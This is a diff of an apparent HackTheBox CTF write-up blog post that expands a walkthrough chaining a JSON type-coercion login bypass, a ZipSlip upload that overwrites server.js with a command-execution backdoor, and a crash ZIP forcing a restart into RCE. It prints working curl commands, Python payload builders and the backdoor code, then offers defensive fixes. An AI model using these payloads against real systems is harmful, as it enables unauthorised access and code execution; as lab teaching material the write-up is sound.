@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "PeppermintRoute CTF Writeup"
-date: 2025-12-22 14:00:00 +0300
+date: 2025-12-22 13:05:00 +0300
 categories: [HackTheBox, CTFs]
 tags: [cybersecurity, web, hackthebox, sqli, zipslip, rce, nodejs]
 ---
@@ -281,52 +281,95 @@ Send a POST request to `/login` with the JSON payload:
 curl -X POST "http://TARGET:PORT/login" \
   -H "Content-Type: application/json" \
   -d '{"username": {"role": "user"}, "password": {"role": "user"}}' \
-  -c admin_cookies.txt
+  -c admin_cookies.txt -v
 ```
 
-This grants access to the admin dashboard! 🎉
+Response:
+```
+< HTTP/1.1 302 Found
+< Set-Cookie: connect.sid=s%3Axxxxxxxxx...; Path=/; HttpOnly
+< Location: /admin/dashboard
+```
+
+We're redirected to admin dashboard! 🎉
 
 ---
 
-### Step 2: Login as Pilot
+### Step 2: Get Pilot Credentials
 
-We also need a pilot account to access the `/user/packages/.../download` endpoint (admin cannot download directly).
+We need a pilot account because the download endpoint in `fileController.js` checks:
 
-First, get the pilot usernames from the admin API:
+```javascript
+if (packageResults[0].assigned_to !== req.session.username) {
+    return res.status(403).json({ error: 'Access denied' });
+}
+```
+
+Only the assigned pilot can download files. Let's get pilot usernames:
 
 ```bash
 curl -X GET "http://TARGET:PORT/api/admin/pilots-data" \
   -b admin_cookies.txt
 ```
 
-Then login as a pilot using the same SQLi technique:
+Response:
+```json
+{
+    "pilots": [
+        {
+            "id": 2,
+            "username": "pilot_aurora_ae52c6c717b5ae33801d91ab51189b02",
+            "destination": "Northern Lights Station"
+        },
+        // ... more pilots
+    ]
+}
+```
+
+Login as a pilot using the same type coercion trick:
 
 ```bash
 curl -X POST "http://TARGET:PORT/login" \
   -H "Content-Type: application/json" \
-  -d '{"username": "pilot_aurora_...", "password": {"role": "admin"}}' \
+  -d '{"username": "pilot_aurora_ae52c6c717b5ae33801d91ab51189b02", "password": {"role": "admin"}}' \
   -c pilot_cookies.txt
 ```
+
+> 💡 Here we use the **exact username** but still bypass password check with the object payload.
+{: .prompt-info }
 
 ---
 
 ### Step 3: Overwrite `server.js` with Backdoor
 
-Create a malicious ZIP file containing a file named `../../../server.js` with this backdoor:
+The upload flow in `adminController.js`:
 
 ```javascript
-const express = require('express');
-const { exec } = require('child_process');
-const app = express();
-app.get('/backdoor', (req, res) => {
-    exec(req.query.cmd, (err, stdout, stderr) => {
-        res.send(stdout + stderr);
-    });
-});
-app.listen(3000, '0.0.0.0');
+exports.uploadFiles = async (req, res) => {
+    const { recipient } = req.params;
+    
+    for (const file of req.files) {
+        if (file.originalname.endsWith('.zip')) {
+            const zipPath = file.path;
+            const extractDir = path.dirname(zipPath);  // /app/data/uploads/recipient/
+            
+            const parser = new ZipParser(zipPath);
+            const extractedFiles = parser.extractAll(extractDir);
+            // ...
+        }
+    }
+};
 ```
 
-Python script to create the malicious ZIP:
+Files are extracted to `/app/data/uploads/{recipient}/`. With ZipSlip, we can write to:
+
+```
+/app/data/uploads/clarion/../../../server.js
+        ↓ resolves to ↓
+/app/server.js
+```
+
+**Python script to create malicious ZIP:**
 
 ```python
 import zipfile
@@ -335,29 +378,43 @@ import io
 backdoor_code = '''const express = require('express');
 const { exec } = require('child_process');
 const app = express();
+
+// Simple command execution backdoor
 app.get('/backdoor', (req, res) => {
     exec(req.query.cmd, (err, stdout, stderr) => {
         res.send(stdout + stderr);
     });
 });
+
 app.listen(3000, '0.0.0.0');
 '''
 
 zip_buffer = io.BytesIO()
 with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+    # ZipSlip payload - escape 3 directories to reach /app/
     zf.writestr('../../../server.js', backdoor_code)
 
 with open('backdoor.zip', 'wb') as f:
     f.write(zip_buffer.getvalue())
+    
+print("[+] backdoor.zip created!")
 ```
 
-Upload this via `/admin/recipients/clarion/upload`.
+Upload via admin panel:
+
+```bash
+curl -X POST "http://TARGET:PORT/admin/recipients/clarion/upload" \
+  -b admin_cookies.txt \
+  -F "file=@backdoor.zip"
+```
+
+At this point, `/app/server.js` is overwritten but the OLD code is still running in memory. We need to crash the server!
 
 ---
 
 ### Step 4: Trigger Server Crash
 
-Create a crash ZIP with two entries:
+**Python script to create crash ZIP:**
 
 ```python
 import zipfile
@@ -365,44 +422,152 @@ import io
 
 zip_buffer = io.BytesIO()
 with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-    # First create the directory
-    zf.writestr('crash_me/placeholder.txt', 'placeholder')
-    # Then try to write a file with the same name (will fail)
-    zf.writestr('crash_me', 'crash content')
+    # First: create a directory
+    zf.writestr('crash_me/placeholder.txt', 'x')
+    
+    # Second: try to write a FILE with same name as directory
+    # This will fail, but path gets added to extractedFiles BEFORE writeFileSync
+    zf.writestr('crash_me', 'x')
 
 with open('crash.zip', 'wb') as f:
     f.write(zip_buffer.getvalue())
+    
+print("[+] crash.zip created!")
 ```
 
-Upload this ZIP, then:
+**Why this works - detailed code flow:**
 
-1. Find the `fileId` for `crash_me` from `/api/admin/package/clarion`
-2. Use the pilot session to request `/user/packages/clarion/download?fileId=...`
+```javascript
+// In ZipParser.extractAll()
+for (const entry of entries) {
+    const fullPath = path.join(destDir, entry.fileName);
+    
+    // For 'crash_me/placeholder.txt' → creates directory 'crash_me/'
+    // For 'crash_me' → fullPath points to existing directory
+    
+    extractedFiles.push(fullPath);  // ← Added BEFORE write attempt!
+    
+    fs.writeFileSync(fullPath, content);  // ← FAILS for directory!
+}
+return extractedFiles;  // Contains 'crash_me' (the directory path)
+```
 
-The server crashes and `supervisord` restarts it, loading the backdoored `server.js`! 💥
+Upload crash ZIP and trigger:
+
+```bash
+# Upload crash.zip
+curl -X POST "http://TARGET:PORT/admin/recipients/clarion/upload" \
+  -b admin_cookies.txt \
+  -F "file=@crash.zip"
+
+# Get the fileId for 'crash_me'
+curl "http://TARGET:PORT/api/admin/package/clarion" \
+  -b admin_cookies.txt | jq '.files[] | select(.filename=="crash_me")'
+
+# Trigger crash with pilot session
+curl "http://TARGET:PORT/user/packages/clarion/download?fileId=CRASH_FILE_ID" \
+  -b pilot_cookies.txt
+```
+
+The server crashes with:
+```
+Error: EISDIR: illegal operation on a directory, read
+```
+
+**supervisord** detects the crash and restarts the server → loads our backdoored `server.js`! 💥
 
 ---
 
 ### Step 5: Read Flag 🏁
 
-Access the backdoor to execute `/readflag`:
+Wait a few seconds for the server to restart, then:
 
 ```bash
 curl "http://TARGET:PORT/backdoor?cmd=/readflag"
+```
+
+```
+HTB{.....}
 ```
 
 **Flag captured!** 🎄🚩
 
 ---
 
+## 🛡️ Vulnerability Chain Summary
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    ATTACK CHAIN VISUALIZATION                    │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  1. Type Coercion SQLi          2. ZipSlip                      │
+│  ┌──────────────────┐           ┌──────────────────┐            │
+│  │ POST /login      │           │ Upload backdoor  │            │
+│  │ {"user": {...}}  │ ────────► │ ../../../server  │            │
+│  │ Bypass Auth      │           │ Overwrite file   │            │
+│  └──────────────────┘           └──────────────────┘            │
+│           │                              │                       │
+│           ▼                              ▼                       │
+│  ┌──────────────────┐           ┌──────────────────┐            │
+│  │ Admin + Pilot    │           │ 3. Crash Server  │            │
+│  │ Sessions         │           │ Download dir     │            │
+│  └──────────────────┘           │ Unhandled error  │            │
+│                                 └──────────────────┘            │
+│                                          │                       │
+│                                          ▼                       │
+│                                 ┌──────────────────┐            │
+│                                 │ 4. RCE via       │            │
+│                                 │ /backdoor?cmd=   │            │
+│                                 │ /readflag        │            │
+│                                 └──────────────────┘            │
+│                                          │                       │
+│                                          ▼                       │
+│                                      🚩 FLAG                     │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
 ## 🧠 Key Takeaways
 
-This challenge demonstrates several important web security concepts:
+### For Developers:
 
-1. **Type Coercion Attacks**: Even parameterized queries can be vulnerable when unexpected data types are passed
-2. **ZipSlip**: Always validate extracted file paths against directory traversal
-3. **Error Handling**: Unhandled stream errors in Node.js can crash the entire process
-4. **Defense in Depth**: Multiple small vulnerabilities can be chained for critical impact
+1. **Never trust `body-parser` with `extended: true`** - validate input types explicitly
+2. **ZipSlip is still common** - always use `path.resolve()` and check if output stays in target directory
+3. **Handle ALL stream errors** - use `.on('error', handler)` on every stream
+4. **The `try/catch` myth** - it doesn't catch async/event-based errors
+
+### Secure ZipParser Fix:
+
+```javascript
+extractAll(destDir) {
+    const resolvedDest = path.resolve(destDir);
+    
+    for (const entry of entries) {
+        const fullPath = path.resolve(destDir, entry.fileName);
+        
+        // SECURITY: Ensure path stays within destination
+        if (!fullPath.startsWith(resolvedDest + path.sep)) {
+            console.error(`Path traversal attempt: ${entry.fileName}`);
+            continue;
+        }
+        
+        // ... rest of extraction
+    }
+}
+```
+
+### Secure Stream Fix:
+
+```javascript
+const fileStream = fs.createReadStream(filePath);
+fileStream.on('error', (err) => {
+    console.error('Stream error:', err);
+    res.status(500).json({ error: 'Error reading file' });
+});
+fileStream.pipe(res);
+```
 
 ---
 
